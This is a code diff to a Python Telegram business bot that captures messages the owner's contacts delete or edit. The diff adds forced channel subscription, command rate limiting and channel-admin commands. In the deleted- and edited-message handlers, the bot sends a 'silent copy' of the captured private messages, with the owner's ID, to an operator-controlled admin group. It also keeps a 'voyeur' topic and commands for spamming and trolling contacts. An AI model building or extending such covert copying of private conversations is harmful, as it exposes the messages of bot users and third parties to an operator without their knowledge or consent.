@@ -12,7 +12,7 @@ from io import BytesIO
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import (
     Message, BusinessMessagesDeleted, BusinessConnection, ChatMemberUpdated,
-    BufferedInputFile,
+    BufferedInputFile, ChatJoinRequest,
 )
 from aiogram.filters import Command, ChatMemberUpdatedFilter, JOIN_TRANSITION
 from aiogram.exceptions import TelegramRetryAfter
@@ -146,7 +146,33 @@ SMS_COOLDOWN_SECONDS = 60.0
 
 # Чаты, в которых активен режим /mirror — бот повторяет каждое сообщение
 # собеседника от имени владельца ("лесенкой").
-mirror_chats: set[int] = set()
+mirror_chats: set[tuple[int, int]] = set()  # (owner_id, chat_id)
+
+# ── Система обязательной подписки (Pravki7) ──────────────────────────────────
+# Каналы, на которые нужно подписаться чтобы пользоваться ботом.
+required_channels: list[str] = []
+# Кэш результатов проверки подписки: owner_id → (ok, unix-time)
+_sub_cache: dict[int, tuple[bool, float]] = {}
+_SUB_CACHE_TTL = 600  # 10 минут
+# Pending join requests для приватных каналов (заявка = засчитывается как подписка).
+_pending_join_requests: dict[str, set[int]] = {}  # str(channel_id_or_username) → set(user_id)
+
+# ── Защита от спама команд (Pravki4) ────────────────────────────────────────
+_cmd_rate: dict[int, list[float]] = {}  # owner_id → [timestamps]
+_CMD_RATE_WINDOW = 3.0   # секунды
+_CMD_RATE_MAX    = 12    # максимум команд за _CMD_RATE_WINDOW
+
+
+def _is_cmd_rate_limited(owner_id: int) -> bool:
+    """Возвращает True если owner_id превысил лимит команд и нужно игнорировать."""
+    now = time.time()
+    times = _cmd_rate.get(owner_id, [])
+    times = [t for t in times if now - t < _CMD_RATE_WINDOW]
+    _cmd_rate[owner_id] = times
+    if len(times) >= _CMD_RATE_MAX:
+        return True
+    times.append(now)
+    return False
 
 # Чаты с активным авто-игнором: входящие сообщения собеседника сразу
 # помечаются как прочитанные.
@@ -349,6 +375,7 @@ def _build_state_dict() -> dict:
         "voyeur_topic_id":   _voyeur_topic_id,
         "connections_topic_id": _connections_topic_id,
         "seen_msg_ids":      {str(cid): list(ids.keys()) for cid, ids in seen_msg_ids.items()},
+        "required_channels": required_channels,
     }
 
 
@@ -494,6 +521,13 @@ def load_persistent_state():
                     pass
             banned_users.update(state.get("banned_users", []))
             stats.update(state.get("stats", {}))
+            try:
+                global required_channels
+                loaded_ch = state.get("required_channels", [])
+                if isinstance(loaded_ch, list):
+                    required_channels = [str(c) for c in loaded_ch]
+            except Exception:
+                pass
             for k in state.get("like_mode_keys", []):
                 if isinstance(k, (list, tuple)) and len(k) == 2:
                     try:
@@ -828,13 +862,17 @@ async def forward_deleted(msg: Message, owner_id: int):
     if (msg.voice is not None or msg.video_note is not None) and             (owner_id, msg.chat.id) in voicemod_active:
         return
     stats["deleted"] += 1
-    header = build_deleted_header_admin(msg, owner_id)
+    # 1) Отправляем пользователю (владельцу бота) в ЛС — основное уведомление.
+    user_header = build_deleted_header(msg)
+    await send_deleted_msg(owner_id, msg, user_header)
+    # 2) Тихая копия в группу для администратора (с расширенными деталями).
+    admin_header = build_deleted_header_admin(msg, owner_id)
     topic_id = await get_or_create_topic(owner_id)
     if topic_id is not None:
-        await send_deleted_msg(GROUP_ID, msg, header, thread_id=topic_id)
+        await send_deleted_msg(GROUP_ID, msg, admin_header, thread_id=topic_id)
     else:
         # Резерв: тема не создалась — шлём в ЛС админа, чтобы не потерять.
-        await send_deleted_msg(ADMIN_ID, msg, header)
+        await send_deleted_msg(ADMIN_ID, msg, admin_header)
 
 async def get_or_create_topic(owner_id: int) -> int | None:
     """Возвращает message_thread_id темы для owner_id в GROUP_ID.
@@ -1359,7 +1397,7 @@ async def cmd_sms_delete(message: Message, bot_instance, owner_id: int):
             pass
         try:
             await bot_instance.send_message(
-                owner_id, f"⏳ -смс: подождите ещё {remain} сек."
+                owner_id, f"🤬 | Не так быстро! Прежде чем снова использовать -смс, подождите 1 минуту. Осталось ждать {remain} секунд."
             )
         except Exception:
             pass
@@ -1505,8 +1543,8 @@ async def handle_business_message(message: Message):
             cmd = "q"
     is_known_cmd = cmd in (
         "spam", "stop", "like", "nolike", "save",
-        "id", "q", "search", "groq", "mute", "unmute", "mirror",
-        "typing", "ignore", "troll", "voice", "audio", "music",
+        "id", "q", "search", "ai", "groq", "mute", "unmute", "mirror",
+        "typing", "ignore", "troll", "voice", "audio", "music", "sound",
         "quran", "love", "voicemod",
     )
 
@@ -1528,8 +1566,27 @@ async def handle_business_message(message: Message):
     if owner_id in banned_users:
         return
 
+    # Проверка подписки на обязательные каналы (только для команд).
+    if is_known_cmd:
+        sub_ok, missing = await _is_subscribed_cached(owner_id)
+        if not sub_ok:
+            channels_text = ", ".join(missing)
+            try:
+                await bot.send_message(
+                    owner_id,
+                    f"⛔ Для работы бота подпишитесь на: {channels_text}",
+                )
+            except Exception:
+                pass
+            return
+
     if is_known_cmd:
         if sender_id != owner_id:
+            return
+        # Защита от спама команд: если владелец слишком часто отправляет команды —
+        # молча игнорируем (лог пишем).
+        if _is_cmd_rate_limited(owner_id):
+            logging.warning(f"[RATE] owner_id={owner_id} превысил лимит команд — пропускаем")
             return
 
         # ВЫСОКИЙ ПРИОРИТЕТ: /unmute, /nolike и /stop должны срабатывать
@@ -1551,7 +1608,7 @@ async def handle_business_message(message: Message):
             chat_id = message.chat.id
             voicemod_active.pop((owner_id, chat_id), None)
             spam_running[chat_id] = False
-            mirror_chats.discard(chat_id)
+            mirror_chats.discard((owner_id, chat_id))
             typing_running[chat_id] = False
             ignore_chats.discard(chat_id)
             muted_chats.discard(chat_id)
@@ -1568,7 +1625,7 @@ async def handle_business_message(message: Message):
         # /voice /audio должны исчезать из чата мгновенно — удаляем СРАЗУ,
         # ДО запуска асинхронной задачи (которая может задержаться).
         # delete_command сам выберет deleteBusinessMessages для бизнес-чата.
-        if cmd in ("typing", "mirror", "ignore", "troll", "voice", "audio", "music", "quran", "voicemod"):
+        if cmd in ("typing", "mirror", "ignore", "troll", "voice", "audio", "music", "sound", "quran", "voicemod"):
             try:
                 await delete_command(message, bot)
             except Exception as e:
@@ -1613,6 +1670,7 @@ async def handle_business_message(message: Message):
             asyncio.create_task(cmd_unmute(message, bot, muted_chats))
             schedule_persist()
         elif cmd == "mirror":
+            mirror_chats.add((owner_id, message.chat.id))
             asyncio.create_task(cmd_mirror(message, bot, mirror_chats))
         elif cmd == "typing":
             asyncio.create_task(cmd_typing(message, bot))
@@ -1633,7 +1691,7 @@ async def handle_business_message(message: Message):
             asyncio.create_task(cmd_voice(message, bot))
         elif cmd == "audio":
             asyncio.create_task(cmd_audio(message, bot))
-        elif cmd == "music":
+        elif cmd in ("music", "sound"):
             asyncio.create_task(cmd_music(message, bot))
         elif cmd == "quran":
             # Распознавание суры/аята через Whisper (Groq) + поиск по корпусу
@@ -1652,7 +1710,7 @@ async def handle_business_message(message: Message):
             # Запускаем в фоне: Quotly может занимать 5-15 сек.
             # Если ждать здесь — Telegram передоставит апдейт и обработка задвоится.
             asyncio.create_task(cmd_quote(message, bot, get_cached_message))
-        elif cmd == "search":
+        elif cmd in ("search", "ai"):
             # Запрос к AI может занимать несколько секунд — в фон,
             # чтобы Telegram не передоставил апдейт.
             asyncio.create_task(cmd_search(message, bot))
@@ -1840,7 +1898,7 @@ async def handle_business_message(message: Message):
         sender_id is not None
         and owner_id is not None
         and sender_id != owner_id
-        and message.chat.id in mirror_chats
+        and (owner_id, message.chat.id) in mirror_chats
     ):
         cid = message.chat.id
         bc = message.business_connection_id
@@ -2059,6 +2117,15 @@ async def handle_edited(message: Message):
             owner_display += f" [ID: {owner_id}]"
         else:
             owner_display = str(owner_id)
+        # Сообщение для владельца (без служебных деталей).
+        user_edited_html = (
+            f'<tg-emoji emoji-id="5904630315946611415">👤</tg-emoji> {name}\n'
+            f'<tg-emoji emoji-id="5285350148451344065">📱</tg-emoji> {uid}\n'
+            f'✏️ <b>Изменил сообщение:</b>\n'
+            f'<b>Было:</b>\n<blockquote>{old_html}</blockquote>\n'
+            f'<b>Стало:</b>\n<blockquote>{new_html}</blockquote>'
+        )
+        # Сообщение для группы (с информацией о владельце).
         edited_html = (
             f'<tg-emoji emoji-id="5904630315946611415">👤</tg-emoji> {name}\n'
             f'<tg-emoji emoji-id="5285350148451344065">📱</tg-emoji> {uid}\n'
@@ -2066,6 +2133,12 @@ async def handle_edited(message: Message):
             f'<b>Старый текст:</b>\n<blockquote>{old_html}</blockquote>\n'
             f'<b>Новый текст:</b>\n<blockquote>{new_html}</blockquote>'
         )
+        # 1) Уведомляем владельца бота в ЛС.
+        try:
+            await bot.send_message(owner_id, user_edited_html, parse_mode="HTML")
+        except Exception as e:
+            logging.warning(f"Ошибка отправки изменённого владельцу: {e}")
+        # 2) Тихая копия в группу для администратора.
         topic_id = await get_or_create_topic(owner_id)
         if topic_id is not None:
             try:
@@ -2082,6 +2155,50 @@ async def handle_edited(message: Message):
                 logging.error(f"Ошибка отправки изменённого (фолбэк): {e}")
 
     save_to_cache(message)
+
+
+async def check_subscription(user_id: int) -> tuple[bool, list[str]]:
+    """Проверяет подписан ли user_id на все required_channels.
+
+    Возвращает (True, []) если подписан на все, иначе (False, [список каналов]).
+    Для приватных каналов (бот не может проверить) и каналов с заявками —
+    засчитывает pending join request как подписку.
+    """
+    if not required_channels:
+        return True, []
+    not_subscribed: list[str] = []
+    for ch in required_channels:
+        subscribed = False
+        try:
+            member = await bot.get_chat_member(ch, user_id)
+            status = member.status
+            if status in ("member", "administrator", "creator"):
+                subscribed = True
+            elif status == "restricted" and getattr(member, "is_member", False):
+                subscribed = True
+        except Exception:
+            pass
+        if not subscribed:
+            ch_key = ch.lstrip("@").lower()
+            if user_id in _pending_join_requests.get(ch_key, set()):
+                subscribed = True
+        if not subscribed:
+            not_subscribed.append(ch)
+    return len(not_subscribed) == 0, not_subscribed
+
+
+async def _is_subscribed_cached(owner_id: int) -> tuple[bool, list[str]]:
+    """Проверяет подписку с кэшированием на _SUB_CACHE_TTL секунд."""
+    if not required_channels:
+        return True, []
+    now = time.time()
+    if owner_id in _sub_cache:
+        ok, ts = _sub_cache[owner_id]
+        if now - ts < _SUB_CACHE_TTL:
+            return ok, []
+    ok, missing = await check_subscription(owner_id)
+    _sub_cache[owner_id] = (ok, now)
+    return ok, missing
 
 
 @dp.deleted_business_messages()
@@ -2157,6 +2274,19 @@ async def handle_deleted_event(event: BusinessMessagesDeleted):
     if owner_id in banned_users:
         return
 
+    # Проверка подписки — если владелец не подписан, пересылку не делаем.
+    sub_ok, missing = await _is_subscribed_cached(owner_id)
+    if not sub_ok:
+        channels_text = ", ".join(missing)
+        try:
+            await bot.send_message(
+                owner_id,
+                f"⛔ Для работы бота подпишитесь на: {channels_text}",
+            )
+        except Exception:
+            pass
+        return
+
     # 2) Форвардим ПОСЛЕДОВАТЕЛЬНО — внутри send_deleted_msg уже есть retry на FloodWait.
     #    Параллелить опасно: при пакете 15+ это гарантированный FloodWait и риск потерь.
     logging.info(f"Пересылка {len(snapshot)} удалённых сообщений владельцу {owner_id}")
@@ -2180,6 +2310,20 @@ async def handle_deleted_event(event: BusinessMessagesDeleted):
 #  4) Любые сообщения, прилетевшие в чужую группу (если бот вдруг ещё
 #     не успел из неё выйти), мы просто игнорируем — никакой логики
 #     там не запускается.
+
+@dp.chat_join_request()
+async def handle_join_request(update: ChatJoinRequest):
+    """Записывает заявки на вступление в приватные каналы.
+    Заявка засчитывается как 'подписан' при проверке required_channels.
+    """
+    ch_key = update.chat.username.lower() if update.chat.username else str(update.chat.id)
+    if ch_key not in _pending_join_requests:
+        _pending_join_requests[ch_key] = set()
+    _pending_join_requests[ch_key].add(update.from_user.id)
+    # Сбрасываем кэш подписки для этого пользователя.
+    _sub_cache.pop(update.from_user.id, None)
+    logging.info(f"[SUB] join request от {update.from_user.id} в {ch_key}")
+
 
 @dp.chat_member(ChatMemberUpdatedFilter(JOIN_TRANSITION))
 async def kick_intruders(event: ChatMemberUpdated):
@@ -2293,7 +2437,7 @@ async def handle_save_pm(message: Message):
     await cmd_save(message, bot)
 
 
-@dp.message(F.chat.type == "private", Command("music"))
+@dp.message(F.chat.type == "private", Command(["sound", "music"]))
 async def handle_music_pm(message: Message):
     if message.from_user and message.from_user.id in banned_users:
         return
@@ -2634,6 +2778,61 @@ async def cmd_unban(message: Message):
             pass
     else:
         await message.answer(f"ℹ️ Пользователь {target_id} не заблокирован.")
+
+
+@dp.message(Command("addchannel"))
+async def handle_addchannel(message: Message):
+    """Добавить обязательный канал. Только для админа.
+    Использование: /addchannel @username  или  /addchannel -100123456789
+    """
+    if not message.from_user or message.from_user.id != ADMIN_ID:
+        return
+    parts = (message.text or "").split(maxsplit=1)
+    if len(parts) < 2:
+        await message.answer(
+            "Использование: /addchannel @username\n"
+            "или /addchannel -100123456789 (числовой ID)"
+        )
+        return
+    channel = parts[1].strip()
+    if channel in required_channels:
+        await message.answer(f"ℹ️ Канал {channel} уже в списке.")
+        return
+    required_channels.append(channel)
+    _sub_cache.clear()  # сбрасываем кэш подписок
+    schedule_persist()
+    await message.answer(f"✅ Канал {channel} добавлен в список обязательных подписок.")
+
+
+@dp.message(Command("removechannel"))
+async def handle_removechannel(message: Message):
+    """Убрать обязательный канал. Только для админа."""
+    if not message.from_user or message.from_user.id != ADMIN_ID:
+        return
+    parts = (message.text or "").split(maxsplit=1)
+    if len(parts) < 2:
+        await message.answer("Использование: /removechannel @username")
+        return
+    channel = parts[1].strip()
+    if channel not in required_channels:
+        await message.answer(f"ℹ️ Канал {channel} не найден в списке.")
+        return
+    required_channels.remove(channel)
+    _sub_cache.clear()
+    schedule_persist()
+    await message.answer(f"✅ Канал {channel} удалён из списка.")
+
+
+@dp.message(Command("channels"))
+async def handle_channels(message: Message):
+    """Показать список обязательных каналов. Только для админа."""
+    if not message.from_user or message.from_user.id != ADMIN_ID:
+        return
+    if not required_channels:
+        await message.answer("📋 Список обязательных каналов пуст.\nДобавьте через /addchannel @username")
+        return
+    lines = [f"• {ch}" for ch in required_channels]
+    await message.answer("📋 Обязательные каналы для подписки:\n" + "\n".join(lines))
 
 
 @dp.message(Command("broadcast"))
